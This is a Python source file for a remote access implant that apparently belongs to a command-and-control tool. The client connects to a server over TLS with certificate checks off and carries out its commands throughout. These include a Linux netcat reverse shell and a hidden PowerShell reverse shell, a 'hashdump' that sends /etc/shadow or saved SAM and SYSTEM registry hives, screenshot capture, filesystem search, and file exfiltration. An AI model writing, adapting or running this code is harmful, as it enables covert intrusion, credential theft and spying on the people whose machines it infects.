import socket
import ssl
import time
import platform

from src.client.utils.config import logger
from utils.socket_utils import readline, read_buffer
from utils.file_utils import FileUtils


class AgentClient:
    def __init__(self, server_host: str, server_port: int) -> None:
        self.server_host = server_host
        self.server_port = server_port
        self.sock = None
        self.running = False

    def _create_context(self):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        return ctx

    def connect(self):
        ctx = self._create_context()

        raw_sock = socket.create_connection(
            (self.server_host, self.server_port),
            timeout=10
        )

        self.sock = ctx.wrap_socket(raw_sock)
        self.sock.settimeout(None)

        self.running = True
        logger.debug("[agent] Connected to %s:%d", self.server_host, self.server_port)

    def run(self):
        if not self.sock:
            raise RuntimeError("Not connected")

        try:
            while self.running:
                chunk = readline(self.sock)

                if not chunk:
                    continue

                self._handle_command(chunk)
        except KeyboardInterrupt:
            logger.debug("[agent] CTRL+C pressed, exiting")
        except Exception as e:
            logger.debug("[agent] %s", e)
        finally:
            self.close()

    def _handle_command(self, cmd):
        logger.info("[agent] Received command: %r", cmd)
        cmd = cmd.decode("utf-8")

        if cmd.startswith("download "):
            filepath = cmd.split()[1].replace("\\", "/")
            self._send_file(filepath)

        elif cmd.startswith("SEND_FILE "):
            filename = cmd.split()[1]
            self._download_file(filename)

        elif cmd.startswith("shell "):
            port = int(cmd.split()[1])
            self._shell(port)

        elif cmd == "ipconfig":
            self._ipconfig()

        elif cmd == "hashdump":
            self._hashdump()

        elif cmd == "screenshot":
            self._screenshot()

        elif cmd.startswith("search "):
            self._search_file(cmd)

        elif cmd == "quit":
            self.running = False

        else:
            pass

    def _shell(self, port):
        try:
            import platform, os
            if platform.system() == "Linux":
                os.system(
                    """
                        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {} {} >/tmp/f
                    """.format(self.server_host, port)
                )
            elif platform.system() == "Windows":
                os.system(
                    """
                        powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{}', {});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()"
                    """.format(self.server_host, port)
                )
            else:
                logger.debug("[agent] Unsupported OS")
        except Exception as e:
            logger.debug("[agent] Shell Error: %s", e)

    def _download_file(self, filename):
        try:
            logger.debug(f"[agent] Uploading File {filename}")
            FileUtils.download_file(self.sock, filename)
        except Exception as e:
            logger.debug("[agent] Error in downloadfile %s", e)

    def _send_file(self, filename: str):
        import os

        try:
            if not os.path.exists(filename):
                self._send_line(f"File not found %s" % filename)
                return
            logger.debug(f"[agent] Downloading File {filename}")
            FileUtils.send_file(self.sock, filename)
        except Exception as e:
            logger.debug("[agent] Error in sendfile %s", e)

    def _send_line(self, text):
        data = (text + "\n").encode("utf-8")
        try:
            self.sock.sendall(data)
        except OSError:
            self.running = False

    def _ipconfig(self):
        import subprocess, platform

        try:
            if platform.system() == "Linux":
                output = subprocess.check_output(["ip", "a"])
            elif platform.system() == "Windows":
                output = subprocess.check_output(["cmd.exe", "/C", "ipconfig"])
            else:
                output = "OS not supported"

            self.sock.sendall(b"DISPLAY\n" + str(len(output)).encode('utf-8') + b"\n" + output)
        except Exception as e:
            logger.debug("[agent] Error in ipconfig %s", e)

    def _search_file(self, cmd):
        import subprocess, platform

        filename = cmd.split()[1]

        try:
            if platform.system() == "Linux":
                output = subprocess.check_output(["find", "/", "-name", f"*{filename}*", "-type", "f"], stderr=subprocess.DEVNULL)
            elif platform.system() == "Windows":
                output = subprocess.run(["powershell", "-NoProfile", "-Command", fr"Get-ChildItem -Path C:\ -Recurse -File -Filter '*{filename}*' -ErrorAction SilentlyContinue | Select-Object -Expand FullName"], capture_output=True, text=True).stdout
            else:
                output = "OS not supported"
            self.sock.sendall(b"DISPLAY\n" + str(len(output)).encode('utf-8') + b"\n" + output.encode('utf-8'))
        except Exception as e:
            logger.debug("[agent] Error in search %s", e)

    def _hashdump(self):
        import subprocess, platform

        try:
            if platform.system() == "Linux":
                FileUtils.send_file(self.sock, "/etc/shadow")
            elif platform.system() == "Windows":
                subprocess.run(["cmd.exe", "/C", r"reg.exe save hklm\sam sam.save"])
                subprocess.run(["cmd.exe", "/C", r"reg.exe save hklm\system system.save"])
                FileUtils.send_file(self.sock, "sam.save")
                FileUtils.send_file(self.sock, "system.save")
                subprocess.run(["cmd.exe", "/C", r"del sam.save"])
                subprocess.run(["cmd.exe", "/C", r"del system.save"])
        except Exception as e:
            logger.debug("[agent] Error in hashdump %s", e)

    def _screenshot(self):
        import subprocess, platform

        try:
            if platform.system() == "Linux":
                subprocess.run(["import", "-window", "root", "screenshot.png"])
            elif platform.system() == "Windows":
                ps_script = r"""
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                $b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $i=New-Object System.Drawing.Bitmap $b.Width,$b.Height
                $g=[System.Drawing.Graphics]::FromImage($i)
                $g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size)
                $i.Save("$pwd\screenshot.png")
                """

                subprocess.run(["powershell", "-NoProfile", "-Command", ps_script], check=True)
            else:
                logger.debug("[agent] Unsupported OS")

            FileUtils.send_file(self.sock, "screenshot.png")
        except Exception as e:
            logger.debug("[agent] Error in screenshot %s", e)

    def close(self):
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None
        logger.debug("[agent] Closed")
